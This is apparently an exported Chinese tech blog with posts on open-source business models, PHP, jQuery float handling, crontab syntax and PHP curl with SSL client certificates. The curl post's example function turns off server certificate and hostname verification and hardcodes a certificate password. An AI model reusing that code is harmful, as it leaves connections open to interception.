<h2 id="盈利模式之三：应用服务托管（ASP）"><a href="#盈利模式之三：应用服务托管（ASP）" class="headerlink" title="盈利模式之三：应用服务托管（ASP）"></a>盈利模式之三：应用服务托管（ASP）</h2><p>例如，PHP Live！ 就是一种构架于 PHP、MySQL 之上的开源软件，它可为企业用户提供实时交谈服务。</p>
<p>目前已经有数十家公开提供 PHP Live！ 托管服务的应用服务提供商。</p>
<h2 id="盈利模式之四：软、硬件一体化"><a href="#盈利模式之四：软、硬件一体化" class="headerlink" title="盈利模式之四：软、硬件一体化"></a>盈利模式之四：软、硬件一体化</h2><p>比如 IBM HP 等服务器供应商巨头，通过捆绑免费的 Linux 操作系统销售硬件服务器。</p>
<p>SUN 公司近期将其 Solaris 操作系统开放源码，以确保服务器硬件的销售收入，也是这种模式的体现。</p>
<h2 id="盈利模式之五：附属品"><a href="#盈利模式之五：附属品" class="headerlink" title="盈利模式之五：附属品"></a>盈利模式之五：附属品</h2><p>O’Reilly 集团是销售开源软件附加产品公司的典型案例，他出版了很多优秀的开放源代码软件的参考资料。</p>
<h2 id="盈利模式之六：品牌战略、服务至上"><a href="#盈利模式之六：品牌战略、服务至上" class="headerlink" title="盈利模式之六：品牌战略、服务至上"></a>盈利模式之六：品牌战略、服务至上</h2><p>康比尔公司的 Compiere ERP &amp; CRM 软件是这种模式的典型案例。</p>
<h2 id="盈利模式之七：市场策略"><a href="#盈利模式之七：市场策略" class="headerlink" title="盈利模式之七：市场策略"></a>盈利模式之七：市场策略</h2><p>比如，微软宣称部分的公开 Office 的源代码，就是执行这种策略。 </p>
<p>事实上，一家公司可能混合采用其中的几种盈利模式，比如康比尔公司不仅采用了第六种品牌策略，同时也采用了第二种提供技术服务的方式。 </p>
<p>在开源软件大潮的冲击之下，包括微软在内的商业软件公司，也开始认可开源软件 “软件成为服务” 的本质。</p>
<p>正如 Navica 公司 CEO 本纳德・高登所说，”短短两三年间，任何人在选择任何企业软件之时，都开始考虑一个问题：是否有开源软件可作替代？”</p>
<h2 id="开源软件的商业化问题探讨"><a href="#开源软件的商业化问题探讨" class="headerlink" title="开源软件的商业化问题探讨"></a>开源软件的商业化问题探讨</h2><p>下面所列的开源软件的商业模式与上篇文章所列虽然在细节上有所不同，但其本质却是相通的，现在就让我们看看其具体内容吧：</p>
<ol>
<li><p>免费软件 + 收费硬件</p>
<p> 比如 IBM、SUN、HP 等公司，在开源软件领域投入巨大，但这一切并非是做善事，它们可以从配置了开源软件的硬件中获得巨额回报。</p>
</li>
<li><p>免费知识 + 收费书籍（培训）</p>
<p> 比如著名的开源软件出版商 O’Reilly 公司，就不遗余力地联系各开源软件权威人士，组织各种开源软件的会议，虽然知识是免费的，但承载知识的书籍却是收费的。</p>
</li>
<li><p>免费程序 + 收费实施</p>
<p> 像中间件、ERP 和 SCM 等企业级信息系统，免费提供这种系统的程序代码，以提供收费的技术服务来赚钱。JBoss 就是这种模式的典型代表。</p>
</li>
<li><p>免费社区版 + 收费企业版</p>
<p> Redhat 自 Redhat Linux 9.0 后将原桌面操作系统转为 Fedora 项目，借 Fedora Core Linux 在开源社区的声望而促进 Redhat Enterprise Linux AS&#x2F;ES&#x2F;WS 服务器产品线的销售。</p>
</li>
<li><p>开源软件 + 商业软件</p>
<p> 比如 Novell 就将自己原来丰富的中间软件和应用软件迁移到 Linux 平台上，通过与 Linux 的捆绑为客户提供高价值的综合解决方案。红旗和 Turbolinux 也在积极加强与应用软件厂商的联系或自己开发商业软件，通过附加更多的商业软件来增加收入。 </p>
</li>
<li><p>免费软件 + 收费专业服务</p>
<p> 典型代表是 SourceLabs 公司和 SpikeSource 公司。这些公司并不主推自己的产品品牌，而是与多方开源软件厂商或社区合作。</p>
</li>
</ol>
<p>现在，IBM 在开源，SUN 在开源，Oracle 在开源，微软也在开源 —— 虽然是极不情愿的。等到某一天，微软完全开源了，国内的这些 “开源软件” 企业还有什么卖点可以向政府和媒体鼓吹呢？</p>
<h2 id="剖析：开源软件能够赚到钱吗？"><a href="#剖析：开源软件能够赚到钱吗？" class="headerlink" title="剖析：开源软件能够赚到钱吗？"></a>剖析：开源软件能够赚到钱吗？</h2><p>中科红旗的总裁赵晓亮曾经用一个关于饮水的比喻来解释开源软件企业是如何赚钱的，大意是人每天都要喝大量的水，但饮水是在不同的环境下、不同的条件下进行的。虽然原料都是水，但性质已经发生了改变。而且水的加工程序越多，大家喝起来就越放心。</p>
<p>Linux 厂商也是同样的价值，大家的源头都是水，但水经过加工、处理，已经与原生态发生了很多变化，而且让喝水的人产生了很多安全感。安全感来自对生产瓶装水的厂商的品牌、技术实力的信任度，来自于对正规大厂的服务能力、可持续发展的信任度等。因此，开源基础上的商业模式，应该就是服务的模式，通过增值服务来收取费用。 </p>
]]></content>
      <categories>
        <category>OpenSource</category>
      </categories>
  </entry>
  <entry>
    <title>Postman Fiddler 使用手册</title>
    <url>/2016/09/postman-fiddler/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>本文主要讲解没有什么主要的内容，主要是一些网上的 Postman 和 fiddle 教程。</p>
<p>本人亲自测试和阅读过，以下是一些链接。</p>
<span id="more"></span>

<h2 id="Postman："><a href="#Postman：" class="headerlink" title="Postman："></a>Postman：</h2><p>一，<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8yYmQ0Y2NhOTQxODU=">Postman 软件安装<i class="fa fa-external-link-alt"></i></span></p>
<p>二，<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8xM2M4MDE3YmI1Yzg=">Postman 使用手册 1—— 导入导出和发送请求查看响应<i class="fa fa-external-link-alt"></i></span></p>
<p>三，<span class="exturl" data-url="aHR0cDovL3d3dy5qaWFuc2h1LmNvbS9wLzE5YzQ3Mzk5NWE4MA==">Postman 使用手册 2—— 管理收藏<i class="fa fa-external-link-alt"></i></span></p>
<p>四，<span class="exturl" data-url="aHR0cDovL3d3dy5qaWFuc2h1LmNvbS9wL2JmZmJjNzliNDNmNg==">Postman 使用手册 3—— 环境变量<i class="fa fa-external-link-alt"></i></span></p>
<p>五，<span class="exturl" data-url="aHR0cDovL3d3dy5qaWFuc2h1LmNvbS9wLzYxY2ZjYjQzNmVlNA==">Postman 使用手册 4——API test<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="Fiddler："><a href="#Fiddler：" class="headerlink" title="Fiddler："></a>Fiddler：</h2><p>一，<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvb2hteWdpcmwvYXJ0aWNsZS9kZXRhaWxzLzE3ODQ2MTk5">【HTTP】Fiddler（一） - Fiddler 简介<i class="fa fa-external-link-alt"></i></span></p>
<p>二，<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvb2hteWdpcmwvYXJ0aWNsZS9kZXRhaWxzLzE3ODQ5OTgz">【HTTP】Fiddler（二） - 使用 Fiddler 做抓包分析<i class="fa fa-external-link-alt"></i></span></p>
<p>三，<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvb2hteWdpcmwvYXJ0aWNsZS9kZXRhaWxzLzE3ODU1MDMx">【HTTP】Fiddler（三）- Fiddler 命令行和 HTTP 断点调试<i class="fa fa-external-link-alt"></i></span></p>
<p>CSDN 中 ohmygirl 有很多关于 PHP 的高质量文章，涨了很多知识，这里介绍其中一片关于 nginx 的，</p>
<p><a href="http://blog.csdn.net/ohmygirl/article/details/18844987">【PHP】nginx 下 <code>file_get_contents</code> 导致 cpu 100% 的问题</a></p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>Fiddler</tag>
        <tag>Postman</tag>
      </tags>
  </entry>
  <entry>
    <title>Php interface 和 api 的区别？</title>
    <url>/2016/09/interface-api/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>这两者没有什么字面的直接关系，interface 我们在大型项目开发中使用，用于约束团队协作的，这是在 OOP 面向对象中常用的。</p>
<p>面向对象中的类有三个特性，封装，继承，多态，所以类的范围比较广，比较繁杂乱。</p>
<span id="more"></span>

<p>所以产生 interface 接口规定没有定义的函数，其他开发人员继承，必须在按照里面的名称进行定义，不能少一个函数也不能多一个函数。</p>
<p>这样就能约束和管理其他开发者，看起来更加简洁。</p>
<p>PHP API 是 PHP 开发平台集成的一些 PHP 的函数库，说白了就是一堆写好的东西让你来使用，好帮助你快速的进行 PHP 程序的开发。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>全栈工程师和架构师的区别</title>
    <url>/2016/09/software-engineer/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>全栈工程师和构架师并不存在高下之分，分工不同而，只不过成为构架师所需要掌握的知识更特殊，而且也更依赖经验。</p>
<p>全栈工程师更多关注功能实现，构架师更关注系统性能。</p>
<span id="more"></span>

<p>全栈工程师主要负责应用开发，对前端后端技术都能熟练使用，更关注应用开发本身，以做新功能为主。</p>
<p>但在大型应用中，除了功能，性能也变得重要，这时候就需要构架师了。构架师考虑的是技术的选型，系统模块之间的连接方式，系统可能的瓶颈，然后还有负载均衡和缓存之类的支持系统。</p>
<p>对于小型系统，只要实现功能即可，性能可以暂时放在一边，全栈工程师最适合。随着系统的更新升级，构架也不断演进，许多以前不会出现的问题渐渐出现，能对这个过程有清晰认识的人，就是架构师</p>
<p>总结，就像 <code>Laravel</code> 和 <code>Yii</code> 一样，一个是全栈框架一个是组件框架，全栈工程师和全栈框架更关注功能的实现，而框架师和组件框架更管组系统性能！</p>
]]></content>
      <categories>
        <category>Software</category>
      </categories>
  </entry>
  <entry>
    <title>jQuery float 类型计算和控制</title>
    <url>/2016/10/javascript-jquery/</url>
    <content><![CDATA[<h2 id="一，由于-javascript-float-数据相乘时得到错误数据，这里使用函数过滤"><a href="#一，由于-javascript-float-数据相乘时得到错误数据，这里使用函数过滤" class="headerlink" title="一，由于 javascript float 数据相乘时得到错误数据，这里使用函数过滤"></a>一，由于 javascript float 数据相乘时得到错误数据，这里使用函数过滤</h2><span id="more"></span>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&#x27;#number0&#x27;</span>).<span class="title function_">blur</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            num = $(<span class="string">&#x27;#number0&#x27;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(!<span class="built_in">isNaN</span>(num))&#123;</span></span><br><span class="line"><span class="language-javascript">                scale = $(<span class="string">&#x27;#scale0&#x27;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                $(<span class="string">&#x27;#cny0&#x27;</span>).<span class="title function_">val</span>(<span class="title function_">accMul</span>(num,scale));</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">accMul</span>(<span class="params">arg1,arg2</span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> m=<span class="number">0</span>,s1=arg1.<span class="title function_">toString</span>(),s2=arg2.<span class="title function_">toString</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span>&#123;m+=s1.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>].<span class="property">length</span>&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span>&#123;m+=s2.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>].<span class="property">length</span>&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="title class_">Number</span>(s1.<span class="title function_">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>))*<span class="title class_">Number</span>(s2.<span class="title function_">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>))/<span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">10</span>,m)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="二，这里通过函数来控制文本框小数点后面的位数"><a href="#二，这里通过函数来控制文本框小数点后面的位数" class="headerlink" title="二，这里通过函数来控制文本框小数点后面的位数"></a>二，这里通过函数来控制文本框小数点后面的位数</h2><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">badFloat</span>(<span class="params">num, size</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isNaN</span>(num)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    num += <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == num.<span class="built_in">indexOf</span>(<span class="string">&#x27;.&#x27;</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> f_arr = num.<span class="built_in">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(f_arr[<span class="number">1</span>].<span class="built_in">length</span> &gt; size)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 格式化小数</span></span><br><span class="line"><span class="comment">//@f float 传入小数: 123; 1.1234; 1.000001;</span></span><br><span class="line"><span class="comment">//@size int 保留位数</span></span><br><span class="line"><span class="comment">//@add bool 进位: 0 舍 1 进</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">formatfloat</span>(<span class="params">f, size, add</span>)&#123;</span><br><span class="line">  f = parseFloat(f);</span><br><span class="line">  <span class="keyword">if</span>(size == <span class="number">2</span>) conf = [<span class="number">100</span>,<span class="number">0.01</span>];</span><br><span class="line">  <span class="keyword">if</span>(size == <span class="number">3</span>) conf = [<span class="number">1000</span>,<span class="number">0.001</span>];</span><br><span class="line">  <span class="keyword">if</span>(size == <span class="number">4</span>) conf = [<span class="number">10000</span>,<span class="number">0.0001</span>];</span><br><span class="line">  <span class="keyword">if</span>(size == <span class="number">5</span>) conf = [<span class="number">100000</span>,<span class="number">0.00001</span>];</span><br><span class="line">  <span class="keyword">if</span>(size == <span class="number">6</span>) conf = [<span class="number">1000000</span>,<span class="number">0.000001</span>];</span><br><span class="line">  <span class="keyword">if</span>(size == <span class="number">7</span>) conf = [<span class="number">10000000</span>,<span class="number">0.0000001</span>];</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">8</span>) conf = [<span class="number">100000000</span>,<span class="number">0.00000001</span>];</span><br><span class="line">  <span class="keyword">var</span> ff = Math.<span class="built_in">floor</span>(f * conf[<span class="number">0</span>]) / conf[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span>(add &amp;&amp; f &gt; ff) ff += conf[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">isNaN</span>(ff)? <span class="number">0</span>: ff;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">vNum</span>(<span class="params">o, len</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($(<span class="string">&quot;#buy_price&quot;</span>).val()!=<span class="string">&quot;&quot;</span> &amp;&amp; $(<span class="string">&quot;#buy_num&quot;</span>).val()!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(badFloat(o.value, len))</span><br><span class="line">        o.value=formatfloat(o.value,len,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> ci = $(<span class="string">&quot;#buy_price&quot;</span>).val()*$(<span class="string">&quot;#buy_num&quot;</span>).val();</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        $(<span class="string">&quot;#buy_money&quot;</span>).<span class="built_in">text</span>(Math.<span class="built_in">round</span>(ci*<span class="number">100</span>)/<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>调用时这样调用：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">onkeyup</span><span class="operator">=</span><span class="string">&quot;vNum(this,2);&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="TODO：第二种-jQuery-的小数点验证可以替换为"><a href="#TODO：第二种-jQuery-的小数点验证可以替换为" class="headerlink" title="TODO：第二种 jQuery 的小数点验证可以替换为"></a>TODO：第二种 jQuery 的小数点验证可以替换为</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;/example/html5/demo_form.asp&quot; <span class="keyword">method</span>=&quot;get&quot;&gt;</span><br><span class="line">Points: &lt;<span class="keyword">input</span> <span class="keyword">type</span>=&quot;number&quot; <span class="type">name</span>=&quot;points&quot; min=&quot;2&quot; step=&quot;0.01&quot; /&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>这种事 HTML5 新属性，同样可以实现限制小数点位数的问题。</p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Crontab 每分钟、每小时、每天、每周、每月、每年定时执行</title>
    <url>/2016/10/linux-contrab/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>每隔十秒执行一次</p>
<p><code>* * * * * sleep 10; /bin/php /www/web/test.php</code></p>
<span id="more"></span>

<p><code>* * * * * sleep 20; /bin/php /www/web/test.php</code></p>
<p><code>* * * * * sleep 30; /bin/php /www/web/test.php</code></p>
<p><code>* * * * * sleep 40; /bin/php /www/web/test.php</code></p>
<p><code>* * * * * sleep 50; /bin/php /www/web/test.php</code></p>
<p>每五分钟执行  *&#x2F;5 * * * *  &#x2F;bin&#x2F;php&#x2F;www&#x2F;web&#x2F;test.php</p>
<p>每小时执行     0 * * * *  &#x2F;bin&#x2F;php&#x2F;www&#x2F;web&#x2F;test.php</p>
<p>每天执行       0 0 * * *  &#x2F;bin&#x2F;php&#x2F;www&#x2F;web&#x2F;test.php</p>
<p>每周执行       0 0 * * 0  &#x2F;bin&#x2F;php&#x2F;www&#x2F;web&#x2F;test.php</p>
<p>每月执行       0 0 1 * *  &#x2F;bin&#x2F;php&#x2F;www&#x2F;web&#x2F;test.php</p>
<p>每年执行       0 0 1 1 *  &#x2F;bin&#x2F;php&#x2F;www&#x2F;web&#x2F;test.php</p>
<h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><p>crontab  -l     查看所有定时任务</p>
<p>crontab  -e    修改定时任务实际上就是修改 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root  这个文件</p>
<p>红帽子下面查看定时任务日志    tail -f &#x2F;var&#x2F;log&#x2F;cron</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>Php 使用 curl 库进行 SSL 双向认证</title>
    <url>/2016/10/php-curl-ssl/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>官方文档：</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5waHAubmV0L21hbnVhbC96aC9mdW5jdGlvbi5jdXJsLXNldG9wdC5waHAjMTA2OTI=">http://www.php.net/manual/zh/function.curl-setopt.php#10692<i class="fa fa-external-link-alt"></i></span></p>
<span id="more"></span>

<p>官方举例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_VERBOSE, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_CAINFO,  <span class="title function_ invoke__">getcwd</span>().<span class="string">&#x27;/cert/ca.crt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSLCERT, <span class="title function_ invoke__">getcwd</span>().<span class="string">&#x27;/cert/mycert.pem&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSLCERTPASSWD, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于业务原因，后台登陆需要使用 SSL 双向认证，即 web 服务器有证书，浏览器客户端也需要安装证书</p>
<p>然后这样的话，php 接口文件就需要走 443 端口来访问了</p>
<h2 id="直接附上代码："><a href="#直接附上代码：" class="headerlink" title="直接附上代码："></a>直接附上代码：</h2><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * <span class="built_in">@name</span> ssl Curl Post数据</span><br><span class="line"> * @param<span class="built_in"> string</span> <span class="variable">$url</span> 接收数据的api</span><br><span class="line"> * @param<span class="built_in"> string</span> <span class="variable">$vars</span> 提交的数据</span><br><span class="line"> * @param int <span class="variable">$second</span> 要求程序必须在<span class="variable">$second</span>秒内完成,负责到<span class="variable">$second</span>秒后放到后台执行</span><br><span class="line"> * @<span class="keyword">return</span><span class="built_in"> string</span> <span class="keyword">or</span><span class="built_in"> boolean</span> 成功且对方有返回值则返回</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> curl_post_ssl(<span class="variable">$url</span>, <span class="variable">$vars</span>, <span class="variable">$second</span>=<span class="number">30</span>,<span class="variable">$aHeader</span>=<span class="keyword">array</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">    //curl_setopt(<span class="variable">$ch</span>,CURLOPT_VERBOSE,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_TIMEOUT,<span class="variable">$second</span>);</span><br><span class="line"></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_SSL_VERIFYPEER<span class="built_in">,false</span>);</span><br><span class="line"></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_SSL_VERIFYHOST<span class="built_in">,false</span>);</span><br><span class="line"></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_SSLCERTTYPE,<span class="string">&#x27;PEM&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_SSLCERT,<span class="string">&#x27;/data/cert/php.pem&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_SSLCERTPASSWD,<span class="string">&#x27;1234&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_SSLKEYTYPE,<span class="string">&#x27;PEM&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_SSLKEY,<span class="string">&#x27;/data/cert/php_private.pem&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in"> count</span>(<span class="variable">$aHeader</span>) &gt;= <span class="number">1</span> )&#123;</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$aHeader</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_POSTFIELDS,<span class="variable">$vars</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">else</span>   </span><br><span class="line">        <span class="keyword">return</span><span class="built_in"> false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参数解释："><a href="#参数解释：" class="headerlink" title="参数解释："></a>参数解释：</h2><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">CURLOPT_TIMEOUT：超时时间</span><br><span class="line"></span><br><span class="line">CURLOPT_RETURNTRANSFER：是否要求返回数据</span><br><span class="line"></span><br><span class="line">CURLOPT_SSL_VERIFYPEER：是否检测服务器的证书是否由正规浏览器认证过的授权 CA 颁发的</span><br><span class="line"></span><br><span class="line">CURLOPT_SSL_VERIFYHOST：是否检测服务器的域名与证书上的是否一致</span><br><span class="line"></span><br><span class="line">CURLOPT_SSLCERTTYPE：证书类型，<span class="string">&quot;PEM&quot;</span> (<span class="keyword">default</span>), <span class="string">&quot;DER&quot;</span>, and<span class="string">&quot;ENG&quot;</span>.</span><br><span class="line"></span><br><span class="line">CURLOPT_SSLCERT：证书存放路径</span><br><span class="line"></span><br><span class="line">CURLOPT_SSLCERTPASSWD：证书密码</span><br><span class="line"></span><br><span class="line">CURLOPT_SSLKEYTYPE：私钥类型，<span class="string">&quot;PEM&quot;</span> (<span class="keyword">default</span>), <span class="string">&quot;DER&quot;</span>, and<span class="string">&quot;ENG&quot;</span>.</span><br><span class="line"></span><br><span class="line">CURLOPT_SSLKEY：私钥存放路径</span><br></pre></td></tr></table></figure>
<p>由于 php 的 curl 只支持 pem 格式、der、eng 格式，而之前生成的是 p12 的格式，所以需要转换一下</p>
<p>PKCS#12 到 PEM 的转换</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>openssl pkcs12 -nocerts -nodes -in cert.p12 -<span class="keyword">out</span> <span class="keyword">private</span>.pem</span><br></pre></td></tr></table></figure>

<p>验证 </p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>openssl pkcs12 -clcerts -nokeys -in cert.p12 -<span class="keyword">out</span> cert.pem</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>curl</tag>
        <tag>SSL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 中获取远程文件的三种方法</title>
    <url>/2016/10/php-remote/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h2 id="使用-file-get-contents"><a href="#使用-file-get-contents" class="headerlink" title="使用 file_get_contents"></a>使用 file_get_contents</h2><span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://www.xxx.com/&#x27;</span>;</span><br><span class="line"><span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">//如果出现中文乱码使用下面代码</span></span><br><span class="line"><span class="comment">//$getcontent = iconv(“gb2312″, “utf-8″,file_get_contents($url));</span></span><br><span class="line"><span class="comment">//echo $getcontent;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$contents</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

